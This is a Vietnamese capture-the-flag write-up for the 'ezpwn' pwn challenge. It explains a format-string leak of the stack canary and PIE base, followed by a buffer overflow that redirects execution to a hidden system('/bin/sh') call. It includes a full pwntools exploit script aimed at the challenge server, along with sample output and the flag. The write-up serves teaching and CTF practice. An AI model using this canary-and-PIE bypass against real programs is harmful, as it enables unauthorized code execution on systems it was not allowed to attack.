---
layout: single
title: "[Writeup] HCMUTE CTF 2026 - ezpwn (Format String & Buffer Overflow)"
date: 2026-01-29
classes: wide
categories: [HCMUTE CTF 2026, pwn]
tags: [hcmute, pwn, format string, buffer overflow, rop]
permalink: /writeups/hcmute-ctf-ezpwn/
---

Chào mọi người, tiếp nối chuỗi bài giải HCMUTE CTF mảng Pwn, hôm nay mình sẽ chia sẻ về bài **ezpwn**. Đây là một bài khá thú vị kết hợp cả lỗi Format String và Buffer Overflow để khai thác hàm ẩn (Hidden Function).

## 1. Thông tin challenge

- **Tên:** ezpwn
- **Server:** `nc 103.130.211.150 19068`
- **Flag:** `UTECTF{d0N't_m4K3_th12_m1St4k3_4g41N!!!}`

## 2. Phân tích ban đầu

### Kiểm tra file binary

Đầu tiên, mình kiểm tra file binary xem nó là loại gì và có các cơ chế bảo vệ nào.

```bash
$ file ezpwn
ezpwn: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked

$ checksec ezpwn
Arch:       amd64-64-little
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
```

Như các bạn thấy, binary này được bật "full option" các cơ chế bảo vệ:
- **PIE (Position Independent Executable):** Địa chỉ code sẽ bị random mỗi lần chạy.
- **Stack Canary:** Có giá trị canary ở cuối stack để phát hiện overflow.
- **NX (No Execute):** Không thể thực thi code trên stack (shellcode không chạy được).
- **Full RELRO:** Bảng GOT là read-only, không thể ghi đè GOT.

Nghe có vẻ "căng", nhưng hãy xem code có gì.

### Phân tích các hàm

Mình dùng `nm` để lướt qua các hàm trong chương trình:

```bash
$ nm ezpwn
0000000000001230 T banner
0000000000001268 T get_point  # <-- Ồ, hàm này tên lạ nè!
00000000000012c7 T main
00000000000011e9 T setup
```

Hàm `get_point` đập vào mắt mình ngay lập tức. Thường thì những hàm có tên lạ trong CTF Pwn hay ẩn chứa điều thú vị.

### Phân tích luồng chương trình (Disassembly)

Mình dùng `objdump -d` để xem assembly của hàm `main` và `get_point`.

**Hàm main:**

```assembly
12c7 <main>:
    ...
    134d: lea -0x30(%rbp),%rax    # Buffer 1 nằm tại rbp-0x30
    1351: mov $0x14,%edx          # Đọc 20 bytes (0x14)
    135e: call read               # Nhập input lần 1
    
    1377: lea -0x30(%rbp),%rax    # Lấy địa chỉ buffer 1
    137e: mov $0x0,%eax
    1383: call printf             # ⚠️ FORMAT STRING VULNERABILITY!
    
    13ba: lea -0x50(%rbp),%rax    # Buffer 2 nằm tại rbp-0x50
    13be: mov $0x200,%edx         # Đọc tới 512 bytes (0x200)
    13cb: call read               # Nhập input lần 2
```

Từ đoạn assembly trên, mình phát hiện ra 2 lỗi nghiêm trọng:
1.  **Format String:** Ở dòng `1383`, chương trình gọi `printf(buffer1)` mà không có format specifier (như `%s`). Điều này cho phép mình đọc (leak) dữ liệu trên stack bằng cách nhập inputs như `%p`, `%x`.
2.  **Buffer Overflow:** Ở dòng `13ba` và `13be`, chương trình đọc tới **512 bytes** vào buffer 2, trong khi buffer này chỉ nằm ở `rbp-0x50` (cách saved RIP khoảng 80 bytes). Đây là lỗi tràn bộ đệm cổ điển.

**Hàm get_point (Hàm ẩn):**

```assembly
1268 <get_point>:
    ...
    1288: lea 0xdab(%rip),%rax   # Load string "This is your last points back..."
    1295: mov %rax,%rdi
    1298: call puts               # In thông báo
    
    129d: lea 0xdd7(%rip),%rax   # Load địa chỉ "/bin/sh"
    12a4: mov %rax,%rdi
    12a7: call system             # ⭐ Gọi system("/bin/sh")!
```

Quá tuyệt! Hàm `get_point` thực sự gọi `system("/bin/sh")`. Mục tiêu của chúng ta đã rõ ràng: **Điều hướng chương trình chạy vào đoạn code gọi system() này.**

> **Lưu ý:** Mình phát hiện là nếu nhảy vào đầu hàm (0x1268), chương trình có thể bị lỗi hoặc in ra dòng text không cần thiết. Để chắc ăn và có shell tương tác tốt, mình sẽ nhảy thẳng vào địa chỉ **0x129d** - nơi bắt đầu chuẩn bị tham số cho hàm `system`.

## 3. Chiến lược khai thác

Vì có Stack Canary và PIE, nên mình không thể buffer overflow ngay lập tức ("đâm đầu vào tường" là crash ngay). Quy trình sẽ như sau:

### Bước 1: Leak thông tin qua Format String (Input 1)

Lợi dụng lỗi `printf`, mình sẽ gửi các chuỗi định dạng để in ra giá trị trên stack. Mình cần tìm 2 giá trị quan trọng:
1.  **Stack Canary:** Để khi mình overflow ở bước sau, mình sẽ ghi lại đúng giá trị này vào vị trí cũ, đánh lừa cơ chế bảo vệ.
2.  **Địa chỉ PIE:** Vì PIE bật, mình không biết hàm `get_point` nằm ở đâu trong bộ nhớ. Mình cần leak một địa chỉ nào đó của chương trình (thường là return address về hàm main hoặc `_start`), từ đó tính ra "PIE Base" (địa chỉ cơ sở).

Sau khi fuzzing (thử nhập `%1$p`, `%2$p`...), mình tìm ra:
- **Offset 17:** Chứa Canary (nhận biết: luôn kết thúc bằng byte `00`).
- **Offset 21:** Chứa một địa chỉ code nằm trong vùng PIE (địa chỉ trả về main).

### Bước 2: Tính toán địa chỉ

- `PIE Base` = `(Giá trị leak offset 21)` - `(Offset tĩnh của nó trong file binary)`.
- `Địa chỉ get_point` = `PIE Base` + `0x129d` (offset của lệnh system).

### Bước 3: Tấn công Buffer Overflow (Input 2)

Sau khi có đủ thông tin, ở lần nhập thứ 2, mình sẽ gửi payload bao gồm:
1.  **Padding:** Đệm cho đến khi chạm tới Canary.
    - Buffer 2 tại `rbp-0x50`.
    - Canary tại `rbp-0x8`.
    - Khoảng cách: `0x50 - 0x8 = 0x48` (72 bytes).
2.  **Canary:** Giá trị Canary vừa leak được (8 bytes).
3.  **Saved RBP:** 8 bytes rác (không quan trọng).
4.  **Return Address:** Ghi đè bằng địa chỉ `get_point` (đoạn gọi system) vừa tính được.

Cấu trúc stack sẽ trông như thế này:

```
Địa chỉ cao
+------------------+
| Return Address   | <- Target: Ghi đè bằng địa chỉ system("/bin/sh")
+------------------+
| Saved RBP        | <- 8 bytes rác
+------------------+
| Stack Canary     | <- Ghi lại đúng giá trị Canary đã leak
+------------------+
| ... (72 bytes)   | <- Padding (chữ 'A' chẳng hạn)
+------------------+
| Buffer 2         | <- Input của chúng ta
+------------------+
Địa chỉ thấp
```

## 4. Exploit Code

Dưới đây là script Python sử dụng thư viện `pwntools` để thực hiện tấn công tự động:

```python
#!/usr/bin/env python3
from pwn import *
import time

# Cấu hình
context.arch = 'amd64'
context.log_level = 'info'

# Kết nối tới server
# io = process('./ezpwn') # Dùng local để debug
io = remote('103.130.211.150', 19068)
io.recvuntil(b'>>')

# --- BƯỚC 1: Leak Canary & PIE ---
# Gửi payload format string để leak giá trị tại offset 17 (Canary) và 21 (PIE Leak)
io.sendline(b'%17$p.%21$p')

# Nhận phản hồi và parse giá trị
response = io.recvuntil(b'>>', timeout=3)
log.info(f"Raw response: {response}")

import re
values = re.findall(rb'0x([0-9a-f]+)', response)

if len(values) >= 2:
    canary = int(values[0], 16)
    pie_leak = int(values[1], 16)
    
    log.success(f"Canary tìm thấy: {hex(canary)}")
    log.success(f"PIE leak tìm thấy: {hex(pie_leak)}")
else:
    log.error("Không leak được dữ liệu!")
    exit()

# --- BƯỚC 2: Tính toán địa chỉ ---
# Tính địa chỉ cơ sở (Base Address)
# 0x12c7 là offset của main (hoặc nơi pie_leak trỏ tới, cần verify bằng gdb)
# Ở đây mình giả sử leak trỏ về gần main
pie_base = pie_leak - 0x12c7 
get_point = pie_base + 0x129d  # Offset nhảy thẳng tới system("/bin/sh")

log.info(f"PIE Base: {hex(pie_base)}")
log.info(f"Target (get_point): {hex(get_point)}")

# --- BƯỚC 3: Gửi Payload Buffer Overflow ---
# Payload: Padding (72 bytes) + Canary + Saved RBP (8 bytes) + Return Address
payload = b'A' * 72            
payload += p64(canary)         # Quan trọng: Phải đúng canary để không crash
payload += p64(0)              # RBP giả
payload += p64(get_point)      # Địa chỉ trả về -> hàm win

# Gửi payload
io.send(payload)
time.sleep(0.5) # Đợi một chút cho server xử lý

# --- BƯỚC 4: Tận hưởng thành quả ---
# Gửi lệnh shell để lấy flag
commands = b'cat flag.txt; echo DONE\n'
io.send(commands)
time.sleep(1)

# In kết quả
output = io.recvall(timeout=3).decode(errors='ignore')
log.info(f"Kết quả:\n{output}")
```

## 5. Kết quả

Khi chạy script, mình đã bypass thành công các lớp bảo vệ và lấy được flag:

```
[*] Canary tìm thấy: 0xeb44b0ef71825d00
[*] PIE leak tìm thấy: 0x5587127592c7
[*] PIE Base: 0x558712758000
[*] Target (get_point): 0x55871275929d
[+] Kết quả:
    UTECTF{d0N't_m4K3_th12_m1St4k3_4g41N!!!}DONE
```

Flag là: `UTECTF{d0N't_m4K3_th12_m1St4k3_4g41N!!!}`

## 6. Tổng kết

Qua bài này, mình rút ra vài kinh nghiệm xương máu:
1.  **Đừng bao giờ tin tưởng người dùng:** Hàm `printf` nếu dùng sai cách (không có format string cố định) sẽ là thảm họa.
2.  **Kiểm tra kỹ các hàm "thừa":** Trong binary đôi khi sót lại các hàm debug hoặc backdoor (như `get_point`), chúng là chìa khóa để khai thác.
3.  **Bypass PIE & Canary:** Hai cơ chế này mạnh nhưng không phải là bất khả xâm phạm nếu chương trình có lỗi leak thông tin (Information Leak).

Hẹn gặp mọi người ở các bài writeup tiếp theo của HCMUTE CTF!
